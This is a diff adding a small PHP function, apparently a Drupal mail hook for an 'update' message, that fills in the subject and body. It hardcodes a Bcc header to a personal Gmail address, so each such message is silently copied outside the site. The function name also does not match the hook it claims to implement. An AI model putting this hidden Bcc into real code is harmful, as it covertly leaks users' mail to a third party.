@@ -1,0 +1,14 @@
+<?php
+
+//implement the hook_mail()
+function jwd_event_alter($key, &$message, $params) {
+
+    switch ($key) {
+      case 'update':
+        // Set headers etc
+        $message['headers']['Bcc'] = 'shalin.addweb@gmail.com';
+        $message['subject'] = $params['subject'];
+        $message['body'][] = $params['message'];
+        break;
+    }
+  }
